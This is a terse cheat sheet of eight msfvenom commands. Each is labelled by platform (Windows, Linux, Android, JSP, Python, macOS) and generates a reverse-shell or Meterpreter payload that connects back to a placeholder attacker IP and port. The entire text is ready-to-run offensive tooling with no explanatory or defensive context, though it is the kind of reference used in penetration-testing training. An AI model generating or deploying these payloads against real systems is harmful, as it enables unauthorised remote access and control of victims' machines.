win_shell: msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o shell.exe
win_meterpreter: msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o windows.exe
linux_shell: msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f elf -o shell.elf
linux_meterpreter: msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f elf -o linux.elf
android_meterpreter: msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT R > android.apk
java_shell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o shell.jsp
python_shell: msfvenom -p cmd/unix/reverse_python LHOST=YOUR_IP LPORT=YOUR_PORT -f raw > shell.py
mac_meterpreter: msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f macho -o mac.macho
